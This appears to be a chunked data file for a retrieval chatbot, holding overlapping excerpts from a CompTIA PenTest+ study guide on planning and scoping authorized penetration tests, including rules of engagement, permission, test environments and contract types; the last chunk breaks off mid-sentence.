rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	and conduct attacks during the Attacks and Exploits phase. After the final phase, Post‐exploitation and Lateral Movement, the team shares its findings with the target organization. Describe the tools used by penetration testers. Tools designed for use by cybersecurity professionals and other technologists may also assist penetration testers in gathering information and conducting attacks. Penetration testers use specialized exploitation frameworks, such as Metasploit, to help automate their work. Lab Exercises Activity 1.1: Adopting the Hacker Mindset Before we dive into the many technical examples throughout this book, let's try an example of applying the hacker mindset to everyday life. Think about the grocery store where you normally shop. What are some of the security measures used by that store to prevent the theft of cash and merchandise? What ways can you think of to defeat those controls? Activity 1.2: Using the Cyber Kill Chain Choose a real‐world example of a cybersecurity incident from recent news. Select an example in which there is a reasonable amount of technical detail publicly available. Describe this attack in terms of the Cyber Kill Chain. How did the attacker carry out each step of the process? Were any steps skipped? If there is not enough information available to definitively address an element of the Cyber Kill Chain, offer some assumptions about what may have happened. Chapter 2 Planning and Scoping Penetration Tests THE COMPTIA PENTEST+ EXAM OBJECTIVES COVERED IN THIS CHAPTER INCLUDE: Domain 1: Engagement Management 1.1 Summarize pre‐engagement activities. Scope definition Regulations, frameworks, and standards Privacy Security Rules of engagement Exclusions Test cases Escalation process Testing window Agreement types Non‐disclosure agreement (NDA) Master service agreement (MSA) Statement of work (SoW) Terms of service (ToS) Target selection Classless Inter‐Domain Routing (CIDR) ranges Domains Internet Protocol (IP) addresses Uniform Resource Locator (URL) Assessment types Web Network Mobile Cloud Application programming interface (API) Application Wireless Shared responsibility model Hosting provider responsibilities Customer responsibilities Penetration tester responsibilities Third‐party responsibilities Legal and ethical considerations Authorization letters Mandatory reporting requirements Risk to the penetration tester 1.3 Compare and contrast testing frameworks and methodologies. Open Source Security Testing Methodology Manual (OSSTMM) Council of Registered Ethical Security Testers (CREST) Penetration Testing Execution Standard (PTES) MITRE ATT&CK Open Web Application Security Project (OWASP) Top 10 OWASP Mobile Application Security Verification Standard (MASVS) Purdue model Threat modeling frameworks Damage potential, Reproducibility, Exploitability, Affected users, Discoverability (DREAD) Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege (STRIDE) Operationally Critical Threat, Asset, and Vulnerability Evaluation (OCTAVE) The Engagement Management domain of the CompTIA PenTest+ certification exam objectives deals with preparing for, planning, and scoping a penetration test. In this chapter you will explore pre‐engagement activities such as setting up rules of engagement, handling paperwork such as nondisclosure agreements (NDAs), master service agreements (MSAs), and statements of work (SoWs); handling target selection; and understanding the shared responsibility model and legal and ethical considerations. You will also compare and contrast testing frameworks and methodologies such as the Open Worldwide Application Security Project and many others. Real
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	Elevation of privilege (STRIDE) Operationally Critical Threat, Asset, and Vulnerability Evaluation (OCTAVE) The Engagement Management domain of the CompTIA PenTest+ certification exam objectives deals with preparing for, planning, and scoping a penetration test. In this chapter you will explore pre‐engagement activities such as setting up rules of engagement, handling paperwork such as nondisclosure agreements (NDAs), master service agreements (MSAs), and statements of work (SoWs); handling target selection; and understanding the shared responsibility model and legal and ethical considerations. You will also compare and contrast testing frameworks and methodologies such as the Open Worldwide Application Security Project and many others. Real World Scenario Navigating Compliance Requirements Joanna's organization processes credit cards at multiple retail locations spread throughout a multistate area. As the security analyst for her organization, Joanna is responsible for conducting a regular assessment of the card processing environment. Joanna's organization processes just over 500,000 transactions a year. Because the organization processes transactions, it must adhere to the Payment Card Industry Data Security Standard (PCI DSS) requirements. It also exclusively uses hardware payment terminals that are part of a PCI SSC (Security Standards Council) listed point‐to‐point encryption (P2PE) solution without cardholder data storage. That means that her organization must provide an annual Self‐Assessment Questionnaire (SAQ), have a quarterly network scan run by an approved scanning vendor (ASV), and fill out an Attestation of Compliance form. The attestation includes a requirement that the Report on Compliance be done based on the PCI DSS Requirements and Security Assessment Procedures that currently cover her company. As a penetration tester, you need to be able to determine what requirements you may have to meet for a compliance‐based assessment. Using the information given here, can you figure out what Joanna's assessment process will require? You can start here: https://www.pcisecuritystandards.org/document_library A few questions to get you started: What type of penetration test would you recommend to Joanna? Would a known environment or an unknown environment assessment be the most appropriate, and why? How would you describe the scope of the assessment? What rules of engagement should you specify for the production card processing systems Joanna needs to have tested? What merchant level does Joanna's organization fall into? What Self‐Assessment Questionnaire (SAQ) level is Joanna's company most likely covered by, and why? What questions in the SAQ are likely to be answered NA based on the solution described? Is Joanna's team required to perform vulnerability scans of card processing systems in her environment? Summarizing Pre‐engagement Activities The first step in most penetration testing engagements is determining what should be tested. When this first step is done, it can be considered the pre‐ engagement activities where you can define the scope of the assessment. The scope determines what penetration testers will do and how their time will be spent. Determining the scope requires working with the person or organization for whom the penetration test will be performed. Testers need to understand all of the following as part of the scope definition: Why the test is being performed Whether
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	card processing systems in her environment? Summarizing Pre‐engagement Activities The first step in most penetration testing engagements is determining what should be tested. When this first step is done, it can be considered the pre‐ engagement activities where you can define the scope of the assessment. The scope determines what penetration testers will do and how their time will be spent. Determining the scope requires working with the person or organization for whom the penetration test will be performed. Testers need to understand all of the following as part of the scope definition: Why the test is being performed Whether specific requirements such as compliance or business needs are driving the test What systems, networks, or services should be tested and when What information can and cannot be accessed during testing What the rules of engagement for the test are What techniques are permitted or forbidden To whom the final report will be presented Testers will also need to assess the responsibilities of all parties involved, such as hosting providers, customers, and vendors. Lastly, testers will need to understand legal and ethical considerations required for conducting tests. The Penetration Testing Execution Standard at www.penteststandard.org is a great resource for penetration testers. It includes information about pre‐engagement interactions like those covered in this chapter as well as detailed breakdowns of intelligence gathering, threat modeling, vulnerability analysis, exploitation and post‐ exploitation activities, and reporting. The team that built it also created a technical guideline that can be useful, although some of the material is slightly dated. It's available here: http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines Scope Definition When defining the scope of the test, you must consider many pre‐ engagement activities. The first activity any tester should review is the regulations, frameworks, and standards that will be used when planning for and ultimately conducting your tests. An important consideration that a tester should review is any regulatory, compliance, required frameworks and standards that should be reviewed and followed as part of the test. This could alter your scope and should be clearly understood at this juncture. For example, you may need to ensure that when running tests for a health care provider, you consider HIPAA. You must ensure that patient privacy is protected as part of your test and if you are collecting information, this information may be viewable. Another is when considering PCI and any financial compliance measures that must be followed. As part of the scope definition, make sure you are fully aware of and discuss these regulations before firming up and beginning any testing. This may result in privacy and security issues that the customer may need to consider up front before any testing begins. When planning for your penetration test (pentest), you should begin by attempting to frame the scope of the test, which creates your boundaries and defines who will be affected, what will be tested, and what may be impacted. The scope of the test is considered the first step of your pentest and allows you, the tester, to identify internal
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	scope definition, make sure you are fully aware of and discuss these regulations before firming up and beginning any testing. This may result in privacy and security issues that the customer may need to consider up front before any testing begins. When planning for your penetration test (pentest), you should begin by attempting to frame the scope of the test, which creates your boundaries and defines who will be affected, what will be tested, and what may be impacted. The scope of the test is considered the first step of your pentest and allows you, the tester, to identify internal and external technology that may be part of the test. An example would be testing a company's assets internally, but also noting that they are connected to two separate cloud providers that will also be part of the test. Doing this will also allow you to scope what will and will not be part of the test. Using the previous example, the customer may not want you to test the external cloud providers, which will help firm up the scope of work. Doing this work up front will also help you define what type of assessment you want to conduct. Lastly, the scope definition should clearly define what is in and out of scope. Scoping agreements and the rules of engagement must define more than just what will be tested. In fact, documenting the limitations of the test can be just as important as documenting what will be included. The testing agreement or scope documentation should contain disclaimers explaining that the test is valid only at the point in time when it is conducted and that the scope and methodology chosen can impact the comprehensiveness of the test. After all, a known environment penetration test is far more likely to find issues buried layers deep in a design than an unknown environment test of well‐secured systems! Problem handling and resolution is another key element of the rules of engagement. Although penetration testers and clients always hope that the tests will run smoothly and won't cause any disruption, testing systems and services, particularly in production environments using actual attack and exploit tools, can cause outages and other problems. In those cases, having a clearly defined communication, notification, and escalation path on both sides of the engagement can help minimize downtime and other issues for the target organization. Penetration testers should carefully document their responsibilities and limitations of liability and ensure that clients know what could go wrong and that both sides agree on how it should be handled. This ensures that both the known and unknown impacts of the test can be addressed appropriately. Permission The tools and techniques we will cover in this book are the bread and butter of a penetration tester's job, but they are very likely illegal to use on another owner's equipment without permission. Before you plan (and especially before you execute) a penetration test, you must have appropriate permission. In most cases, you should be
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	document their responsibilities and limitations of liability and ensure that clients know what could go wrong and that both sides agree on how it should be handled. This ensures that both the known and unknown impacts of the test can be addressed appropriately. Permission The tools and techniques we will cover in this book are the bread and butter of a penetration tester's job, but they are very likely illegal to use on another owner's equipment without permission. Before you plan (and especially before you execute) a penetration test, you must have appropriate permission. In most cases, you should be sure to have appropriate documentation for that permission in the form of a signed agreement, a memo from senior management, or a similar “get out of jail free” card from a person or people in the target organization with the rights to give you permission. Why is it called a “get out of jail free” card? It's the document that you would produce if something went wrong. Permission from the appropriate party can help you stay out of trouble if something goes wrong. Scoping Considerations—A Deeper Dive As you've likely already realized, determining the detailed scope of a test can involve a significant amount of work. Even a small organization may have a complex set of systems, applications, and infrastructure, and determining the scope of a penetration test can be challenging unless the organization has detailed and accurate architecture, dataflow, and system documentation. Of course, if the engagement is an unknown environment test, the detail available to penetration testers may be limited, so they will need to know how to avoid going outside of the intended scope of the test. Detailed scoping starts by determining the acceptable targets. Are they first party hosted (internally) or third party hosted (externally), and are they on‐ site or off‐site? Are they hosted by the organization itself, by a third party, or by an infrastructure‐as‐a‐service (IaaS) or other service provider? Are they virtual, physical, or a hybrid, and does this impact the assessment? Are there specific environmental restrictions that need to be applied for the network, applications, or cloud systems and services? Equally important is an understanding of what applications, services, and supporting infrastructure are in scope. It may be desirable or necessary to target elements of infrastructure or systems that are not directly related to the target to access the target. For example, one of the authors of this book targeted the network administration infrastructure for an organization to gain access to the real target of the test he was conducting—a database server that was otherwise too well protected by firewalls. With access to network administration functions, he was able to pivot and get access to unencrypted dataflows between the database and application server that were his real target, as shown in Figure 2.1. FIGURE 2.1 A logical dataflow diagram User accounts and privileged accounts are both commonly part of penetration tests, and they can be some of the most important targets for
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	one of the authors of this book targeted the network administration infrastructure for an organization to gain access to the real target of the test he was conducting—a database server that was otherwise too well protected by firewalls. With access to network administration functions, he was able to pivot and get access to unencrypted dataflows between the database and application server that were his real target, as shown in Figure 2.1. FIGURE 2.1 A logical dataflow diagram User accounts and privileged accounts are both commonly part of penetration tests, and they can be some of the most important targets for penetration testers; that means determining which accounts are in scope and which aren't. With an unknown environment, limitations on accounts can create challenges if you aren't allowed to use an account that you may be able to access. Of course, with a known environment test (and possibly with a partial knowledge test), you should have access to the accounts you need to perform the test. Wireless and wired network scoping often comes into play for penetration testers who will conduct on‐site work or when the network itself is in scope. Thus, it's important to know which SSIDs belong to your target and which are valid targets. At the same time, knowing which subnets or IP ranges are in scope is also key to avoid targeting third parties or otherwise going outside of the penetration test's scope. Third‐party or cloud‐hosted environments can make all of this more difficult. Software as a service (SaaS) is typically shared with other customers, and you are unlikely to be permitted to conduct a penetration test against it on behalf of your client or employer. IaaS environments like Amazon Web Services (AWS), Microsoft Azure, and Google Cloud can all be critical infrastructure for organizations but may have specific rules or requirements for security testing. Once you have determined what assets are in scope and out of scope, you will need to build lists or filters to ensure that you don't inadvertently target out‐of‐scope assets, systems, or other potential targets. That may include a list of IP addresses, hostnames, or other details. Targeting out‐of‐scope assets can result in significant issues, impact on business operations, or even contractual issues. It is important to keep careful logs of the actions you take while conducting a penetration test. That way, if a problem occurs, you can show what was going on at that time. The authors of this book have used their logs to demonstrate which systems were being vulnerability scanned when a service crashed in multiple cases. In some, the scanner wasn't the cause; in others it was, showing that the service wasn't up to being scanned! As you work through all the details for a scoping exercise, you should also make sure you have an in‐depth discussion about the target organization's risk acceptance and company policies. Are the organization and the sponsor ready and able to accept that a penetration test could cause an outage or service disruption?
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	on at that time. The authors of this book have used their logs to demonstrate which systems were being vulnerability scanned when a service crashed in multiple cases. In some, the scanner wasn't the cause; in others it was, showing that the service wasn't up to being scanned! As you work through all the details for a scoping exercise, you should also make sure you have an in‐depth discussion about the target organization's risk acceptance and company policies. Are the organization and the sponsor ready and able to accept that a penetration test could cause an outage or service disruption? If not, is there a way to conduct the test in a way that will either minimize risk or prevent it? What is the organization's impact tolerance? Is a complete outage acceptable as part of the test? What if an account lockout happens? Is there a particular time of day or part of the business or recurring IT maintenance cycle when a test would be less disruptive? In addition to these specific business reasons, a complete scope review for a customer or organization is likely to include at least some discussion of business processes and practices that the tester may encounter. These could include administrative processes, account management, or any other business process that the tester might target or disrupt as part of their testing process. As a penetration tester, make sure that you discuss the potential for impact, and inquire about any processes that should be treated with care or avoided. The amount of time and effort that you will spend on a penetration test can also be an important part of a scoping document. While some penetration tests are allowed to take as much time as they need, most will have some form of time or effort limitations. This can help with time management for the penetration testing team, since they will know how much time to spend on a given task or procedure. Scope creep, or the addition of more items and targets to the scope of the assessment, is a constant danger for penetration tests. During the scoping phase, you are not likely to know all the details of what you may uncover, and during the assessment itself you may encounter unexpected new targets. It is important to ensure that you have planned for this with the sponsor of the penetration test and know how you will handle it. They may opt to retain the original scope, engage you to perform further work, or request an estimate on the new scope. Once you've created an initial scoping document, it should be reviewed with the client or sponsor of the engagement. Both sides need to review and accept the scope and should sign off on it. Questions from both sides should be documented, and the scope or other documentation should include that material if appropriate. Support Resources for Penetration Tests Penetration testers can take advantage of internal documentation to help plan their testing (and unknown environment testers
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	will handle it. They may opt to retain the original scope, engage you to perform further work, or request an estimate on the new scope. Once you've created an initial scoping document, it should be reviewed with the client or sponsor of the engagement. Both sides need to review and accept the scope and should sign off on it. Questions from both sides should be documented, and the scope or other documentation should include that material if appropriate. Support Resources for Penetration Tests Penetration testers can take advantage of internal documentation to help plan their testing (and unknown environment testers may manage to acquire this documentation during their work!). There are a multitude of possible documents that each organization may have, but documentation, accounts and access, and budget are all specifically described in the PenTest+ objectives. Documentation The documentation that an organization creates and maintains to support its infrastructure and services can be incredibly useful to a penetration tester. These include the following: Internal knowledgebase articles can provide details that penetration testers can use to discover systems and services and potentially to perform more informed attacks. Architectural diagrams, dataflow diagrams, and other system and design documentation can provide penetration testers with an understanding of potential targets, how they communicate, and other configuration and design details. Configuration files can be treasure troves of information and may contain details including accounts, IP addresses, and even passwords or API keys. Application programming interface (API) documentation describes how software components communicate. Software development kits (SDKs) also provide documentation, and organizations may either create their own SDKs or use commercial or open source SDKs. Understanding which SDKs are in use, and where, can help a penetration tester test applications and services. Third‐party tool, system, and service documentation may also include examples like sample application requests, API examples, or other useful code that testers can use to validate or improve their own testing. This is particularly useful for penetration tests that are directed at web applications or APIs. The W3C and XML‐Based Standards The World Wide Web Consortium (W3C) is an international community organization that defines web standards, including HTML, CSS, XML, web services, and many others. The W3C website at www.w3.org contains information about each of these standards. As a penetration tester, you won't know every XML‐based scheme or markup language you encounter. Fortunately, XML follows a set of standard syntax rules. Classes like w3schools.com's XML tutorial (https://www.w3schools.com/xml/default.asp) can get you started on reading XML documents if you need a quick tutorial. Access and Accounts Known environment assessments will provide direct access to the systems that are being tested. This may include permitting penetration testers past defenses that are normally in place. An unknown environment assessment team won't have that luxury and will have to make their way past those defenses. Common security exceptions for known environment tests include the following: Adding testers to allow lists in intrusion prevention systems (IPSs), web application firewalls (WAFs), and other security devices. Doing so will permit testers to
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	XML tutorial (https://www.w3schools.com/xml/default.asp) can get you started on reading XML documents if you need a quick tutorial. Access and Accounts Known environment assessments will provide direct access to the systems that are being tested. This may include permitting penetration testers past defenses that are normally in place. An unknown environment assessment team won't have that luxury and will have to make their way past those defenses. Common security exceptions for known environment tests include the following: Adding testers to allow lists in intrusion prevention systems (IPSs), web application firewalls (WAFs), and other security devices. Doing so will permit testers to perform their tests without being blocked. For a known environment test, this means that testers won't spend time waiting to be unblocked when security measures detect their efforts. Unknown environment and red‐team tests are more likely to result in testers being blacklisted or blocked by security measures. Security exceptions at the network layer, such as allowing testers to bypass network access controls (NACs) that would normally prevent unauthorized devices from connecting to the network. Bypassing or disabling certificate pinning. What Is Certificate Pinning? Certificate pinning associates a host with an X.509 certificate (or a public key) and then uses that association to make a trust decision. This means that if the certificate changes, the remote system will no longer be recognized and the client shouldn't be able to visit it. Pinning can cause issues, particularly if an organization uses data loss prevention (DLP) proxies that intercept traffic. Pinning can work with this if the interception proxy is also added to the pinning list, called a pinset. Access to user accounts and privileged accounts can play a significant role in the success of a penetration test. Known environment assessments should be conducted using appropriate accounts to enable testers to meet the complete scope of the assessment. Unknown environment tests will require testers to acquire credentials and access. This means a strong security model may make some desired testing impossible—a good result in many cases, but it may leave hidden issues open to insider threats or more advanced threat actors. Physical access to a facility or system is one of the most powerful tools a penetration tester can have. In known environment assessments, testers often have full access to anything they need to test. Unknown environment testers may have to use social engineering techniques or other methods we will discuss later in this book to gain access. Network access, either on‐site, via a VPN, or through some other method, is also important, and testers need access to each network segment or protected zone that should be assessed. This means that a good view of the network in the form of a network diagram and a means to cross network boundaries are often crucial to success. Budget Technical considerations are often the first things that penetration testers think about, but budgeting is also a major part of the business process of penetration testing. Determining a budget and staying within it can make the
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	this book to gain access. Network access, either on‐site, via a VPN, or through some other method, is also important, and testers need access to each network segment or protected zone that should be assessed. This means that a good view of the network in the form of a network diagram and a means to cross network boundaries are often crucial to success. Budget Technical considerations are often the first things that penetration testers think about, but budgeting is also a major part of the business process of penetration testing. Determining a budget and staying within it can make the difference between a viable business and a failed effort. The budget required to complete a penetration test is determined by the scope and rules of engagement (or, at times, vice versa if the budget is a limiting factor, thus determining what can reasonably be done as part of the assessment!). For internal penetration testers, a budget may simply involve the allocation of time for the team to conduct the test. For external or commercial testers, a budget normally starts from an estimated number of hours based on the complexity of the test, the size of the team, and any costs associated with the test, such as materials, insurance, or other expenditures that aren't related to personnel time. Defining Assessment Types There are quite a few ways to categorize and describe assessments, but it helps to have some broad categories to sort them into. As you consider types of assessments, you may find it useful to think of them in categories like these: Goals‐based or objectives‐based assessments are conducted for specific reasons. Examples include validation of a new security design, testing an application or service infrastructure before it enters production, and assessing the security of an organization that has recently been acquired. Compliance‐based assessments are designed around the compliance objectives of a law, standard, or other guidance and may require engaging a specific provider or assessor that is certified to perform the assessment. Red‐team assessments are typically more targeted than normal penetration tests. Red teams attempt to act like an attacker, targeting sensitive data or systems with the goal of acquiring data and access. Unlike other types of penetration tests, red‐team assessments are not intended to provide details of all the security flaws a target has. This means that red‐team assessments are unlikely to provide as complete a view of flaws in the environment, but they can be very useful as a security exercise to train incident responders or to help validate security designs and practices. Red teams test the effectiveness of a security program or system by acting like attackers. Red teams are sometimes called tiger teams. Blue teams are defenders and may operate against red teams or actual attackers. Some security professionals also describe other colors of teams, such as purple teams that work to integrate red‐ and blue‐team efforts to improve organizational security, white teams that control the environment during an exercise, or green teams that tackle long‐term
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	in the environment, but they can be very useful as a security exercise to train incident responders or to help validate security designs and practices. Red teams test the effectiveness of a security program or system by acting like attackers. Red teams are sometimes called tiger teams. Blue teams are defenders and may operate against red teams or actual attackers. Some security professionals also describe other colors of teams, such as purple teams that work to integrate red‐ and blue‐team efforts to improve organizational security, white teams that control the environment during an exercise, or green teams that tackle long‐term vulnerability remediation or act as trainers. Known Environments and Unknown Environments Once the type of assessment is known, one of the first things to decide about a penetration test is how much knowledge testers will have about the environment. Here are three typical classifications used to describe this: Known environment tests, sometimes called “white box,” “crystal box,” (as in you see everything inside) or “full knowledge” tests, are performed with full knowledge of the underlying technology, configurations, and settings that make up the target. Testers will typically have information such as network diagrams, lists of systems and IP network ranges, and even credentials to the systems they are testing. Known environment tests allow effective testing of systems without requiring testers to spend time identifying targets and determining which of them may allow a way in. This means that a known environment test is often more complete, because testers can get to every system, service, or other target that is in scope and will have credentials and other materials that will allow them to be tested. Of course, since testers can see everything inside an environment, they may not provide an accurate view of what an external attacker would see, and controls that would have been effective against most attackers may be bypassed. Unknown environment tests, sometimes called “black box” or “zero knowledge” tests, are intended to replicate what an attacker would encounter. Testers are not provided with access to or information about an environment, and instead, they must gather information, discover vulnerabilities, and make their way through an infrastructure or systems as an attacker would. This can be time‐consuming for the penetration tester, but it can better reveal what vulnerabilities might be exploited by someone starting with nothing. It can also help provide a reasonably accurate assessment of how secure the target is against an attacker of similar or lesser skill. Note that the quality and skill set of your penetration tester or team is very important when conducting an unknown environment penetration test—if the threat actor you expect to target your organization is more capable, a black box tester can't provide you with a realistic view of what they could do. Partial knowledge (sometimes called gray box) tests are a blend of unknown and known environment testing. A partial knowledge test may provide some information about the environment to the penetration testers without giving full access, credentials, or configuration
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	the target is against an attacker of similar or lesser skill. Note that the quality and skill set of your penetration tester or team is very important when conducting an unknown environment penetration test—if the threat actor you expect to target your organization is more capable, a black box tester can't provide you with a realistic view of what they could do. Partial knowledge (sometimes called gray box) tests are a blend of unknown and known environment testing. A partial knowledge test may provide some information about the environment to the penetration testers without giving full access, credentials, or configuration details. A partial knowledge test can help focus penetration testers' time and effort while also providing a more accurate view of what an attacker would actually encounter. Understanding Your Adversaries When an organization conducts an unknown environment penetration test, one of the first questions it will ask is, “Who would attack us and why?” Answering that question can help management make decisions about how a penetration test is conducted, what techniques are considered in the engagement, the scope of the test, and who they will hire to conduct it. Threat actors are often rated by their capabilities. For example, advanced threat actors, script kiddies and casual hackers use prebuilt tools to conduct their attacks, and most organizations will consider their attacks nuisance‐level threats. But as you continue down the threat actors adversary tiers shown in the following graphic, capabilities and resources, and thus the threat an adversary poses, increase. As professional hackers, organized crime, and nation‐state–level attackers like advanced persistent threats (APTs) enter your threat radar, the likelihood of a successful attack and compromise increases. This means that you should assume that a breach will occur and plan accordingly. Each of these potential adversaries is likely to have a different intent; hacktivists may want to make a political or social point, whereas black hats and organized crime are likely to have a profit motive. APT actors are usually focused on a nation‐state's goals, with other attacks driven by that purpose. The Rules of Engagement Once you have determined the type of assessment and the level of knowledge testers will have about the target, the rest of the rules of engagement (RoE) can be written. Key elements include these: The timeline for the engagement and when testing can be conducted: This includes the time of day, and the days of the week or month in some circumstances due to business requirements. Some assessments will intentionally be scheduled for noncritical time frames to minimize the impact of potential service outages, whereas others may be scheduled during normal business hours to help test the organization's reaction to attacks. What locations, systems, applications, or other potential targets are in scope: Common targets include wireless networks, specific IP ranges and domains, the organization's DNS (domain name system) and domains, APIs, physical locations, and both internal and external services and systems. The target list discussion also often includes discussions about third‐party service providers that may be
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	week or month in some circumstances due to business requirements. Some assessments will intentionally be scheduled for noncritical time frames to minimize the impact of potential service outages, whereas others may be scheduled during normal business hours to help test the organization's reaction to attacks. What locations, systems, applications, or other potential targets are in scope: Common targets include wireless networks, specific IP ranges and domains, the organization's DNS (domain name system) and domains, APIs, physical locations, and both internal and external services and systems. The target list discussion also often includes discussions about third‐party service providers that may be impacted by the test, such as Internet service providers, software‐as‐a‐service or other cloud service providers, or outsourced security monitoring services. Any special technical constraints should also be discussed in the RoE. Types of tests that are allowed or disallowed: Common limitations include limiting potentially destructive tests or avoiding social engineering or physical penetration testing, but each engagement should be scoped to meet the needs of the organization for which it will be conducted. Data handling requirements for information gathered during the penetration test: This is particularly important when engagements cover sensitive organizational data or systems. Penetration tests cannot, for example, legally expose protected health information (PHI), even under an NDA (nondisclosure agreement). Requirements for handling often include confidentiality requirements for the findings, such as encrypting data during and after the test, and contractual requirements for disposing of the penetration test data and results after the engagement is over. What behaviors to expect from the target: Defensive behaviors like shunning, blocklisting, or other active defenses may limit the value of a penetration test. If the test is meant to evaluate defenses, this may be useful. If the test is meant to test a complete infrastructure, shunning or blocking the penetration testing team's efforts can waste time and resources. What resources are committed to the test: In full knowledge and partial knowledge testing scenarios, time commitments from the administrators, developers, and other experts on the targets of the test are not only useful, but can also be necessary for an effective test. Legal concerns: Such concerns should also be addressed, including a synopsis of any regulatory concerns affecting the target organization, pentest team, tool restrictions due to local or national laws, any remote locations, and any service providers that will be in scope. When and how communications will occur: Should the engagement include daily or weekly updates regardless of progress, or will the penetration testers simply report when they are done with their work? Who to contact in case of particular events: This includes evidence of ongoing compromise, accidental breach of RoE, the discovery of a critical vulnerability, and other events that warrant immediate attention. Who is permitted to engage the pentest team: For example, can the CFO request an update? Including this in RoE helps avoid potentially awkward denials. Rules of Engagement Considerations As you move toward conducting the test, the scope needs to be defined in technical terms where specific
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	include daily or weekly updates regardless of progress, or will the penetration testers simply report when they are done with their work? Who to contact in case of particular events: This includes evidence of ongoing compromise, accidental breach of RoE, the discovery of a critical vulnerability, and other events that warrant immediate attention. Who is permitted to engage the pentest team: For example, can the CFO request an update? Including this in RoE helps avoid potentially awkward denials. Rules of Engagement Considerations As you move toward conducting the test, the scope needs to be defined in technical terms where specific considerations must be reviewed. When conducting a test, you will need to define specific criteria to include what you will exclude from the test, sample test cases (or use cases), what the escalation process will be during a test, and what agreements need to be in place. You must also scope out the technical area that will be tested, such as what IP address ranges, what domains, URLs, and so on will be tested. In this section you will learn about and focus on certain areas that must be defined prior to starting a test. Basic Considerations As a pentester, there are some basic considerations you need to include in your assessments and overall efforts when working any engagement. These include exclusions (what is not in scope), escalations (what to do when there is a problem) and so on. Let's review all of the basics you will need for not only the work you will do, but also for the exam: Exclusions: When preparing for a test, you need to know what is not in scope. These may take the form of exclusions, which means things that are not going to be scanned or tested. An example would be, if you had a range of IP addresses you needed to test and there were end‐of‐ life (EOL) systems that were being decommissioned and/or were sensitive to certain scans; these systems may be given to the tester as IP addresses to be excluded and not in the scope of the test. Test Cases: Getting ready to test and defining the scope is generally started by generating test cases (also known as use cases). There are times that test cases can give a tester a starting point for scoping. For example, let's say you wanted to test for security vulnerabilities specific to compliance‐related functions. This would be considered the test case and gives you a starting point to begin the focus of your technical work. You can now brush up on the compliance‐related topics needed for your assessment. Escalation Process: An escalation process is a great tool to have up front before you begin your testing. Knowing who to call when you need someone, have a problem, or need to relay or communicate information is essential to success. For example, you can create a call tree with names, numbers, and contact information on those in the organization you would call if you
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	compliance‐related functions. This would be considered the test case and gives you a starting point to begin the focus of your technical work. You can now brush up on the compliance‐related topics needed for your assessment. Escalation Process: An escalation process is a great tool to have up front before you begin your testing. Knowing who to call when you need someone, have a problem, or need to relay or communicate information is essential to success. For example, you can create a call tree with names, numbers, and contact information on those in the organization you would call if you needed help. Using the running example of testing for security vulnerabilities specific to compliance, you may want to create a call tree of those parties who you may need to contact for any of the scenarios just mentioned. An escalation process can be formalized from this call tree where, for example, if you had a test and it caused an issue on a server, you can contact that server manager's supervisor if needed. If they are not reachable, you can then call the manager and continue on until you do reach who you need to solve the issue that may be taking place. Testing Window: The testing window is simply the window of time of when you will conduct the test. For example, you can set the testing window on a Sunday evening from 6 p.m. to 10 p.m. EST. This is the window in which you can operate the test. The reasoning behind a test window being defined in the scope is that it sets an expectation of when the work will be done but it can also be tracked. For example, if you were to conduct a test during this time on a production network, outages may occur, and the issues can be tied back to that time and associated with the testing if it is likely the cause. It can also provide the organization being tested with the ability to conduct a change freeze during that time to ensure that nothing gets in the way of the work the tester may be doing. Agreement Types There are also a number of agreements that need to be fulfilled (or at least considered) when doing work as a pentester. These include items such as NDAs, MSAs and other contractual, policy or procedural agreements you should have in place before and while doing work. The agreement types you should know for the workplace but also for the exam include: Nondisclosure Agreement (NDA): As with most work done by vendors and customers, when service is provided, an NDA is put in place for various reasons. The primary reason is to create privacy for the company but also to protect it legally. As a tester, you may find information that may be sensitive and must be kept sensitive. An NDA provides an agreement between the parties to ensure privacy is maintained. Master Service Agreement (MSA): An MSA is an agreement type that
rag-chatbot\data\PT0-003 - CompTIA PenTest+ Study Guide Exam.txt	and while doing work. The agreement types you should know for the workplace but also for the exam include: Nondisclosure Agreement (NDA): As with most work done by vendors and customers, when service is provided, an NDA is put in place for various reasons. The primary reason is to create privacy for the company but also to protect it legally. As a tester, you may find information that may be sensitive and must be kept sensitive. An NDA provides an agreement between the parties to ensure privacy is maintained. Master Service Agreement (MSA): An MSA is an agreement type that specifies how a vendor will work and interact with a client or customer. It defines items such as deliverables that will be provided, what services will be offered, payment terms and fees and how they will be paid, how privacy will be maintained, and various other provisions that help to protect both the vendor and the client throughout the engagement. Statement of Work (SoW): An SoW can be its own separate agreement or be a part of an MSA. A statement of work defines the specific work that will be done, what is expected (what the expectations are), and what the work requirements are. It can also be broken down further into project deliverables, resources, timelines, and certain activities and tasks that will take place to provide service to the customer or client. Terms of Service (ToS) Agreement: A ToS agreement defines the legal aspects of the arrangement. For example, if the tester is a vendor and providing a service to a customer, the ToS can help to create the signed agreement between parties that explains each service term in clear language so that everyone understands and agrees to what the service offering truly is. This way, once the tester begins work and ultimately concludes work, all parties understand what that work is and what service is offered. Target Selection When conducting a penetration test, as a pentester you will need to identify targets and select them from a series of many options. Building these into your scope of work will help to set expectations on what will be tested. These targets will become what you test and assess, but also report on. When conducting target selection in the workplace but also for the exam, consider the following: Classless Inter‐Domain Routing (CIDR) Ranges: Target selections are critical to defining scope of testing, and the first major scope definition when it comes to technology is what IP address ranges may be in use, which are in scope to scan, and which are excluded. You will need to know what the company is using in terms of IP address ranges and that includes both internal and external or private versus 